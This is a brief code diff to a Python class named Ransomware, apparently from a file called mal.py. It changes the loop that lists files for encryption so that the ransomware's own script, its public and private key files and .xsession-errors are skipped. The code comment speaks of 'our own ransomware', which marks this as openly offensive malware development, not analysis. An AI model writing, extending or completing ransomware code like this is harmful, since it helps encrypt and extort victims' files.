@@ -153,7 +153,7 @@ class Ransomware:
         files = []
         for file in os.listdir(directory):
             # We do not want to encrypt our own ransomware
-            if file == "mal.py" or file == "key.key":
+            if file == "mal.py" or file == "public_key.pem" or file == "private_key.pem" or file == ".xsession-errors":
                 continue
             if os.path.isfile(file):
                 files.append(file)
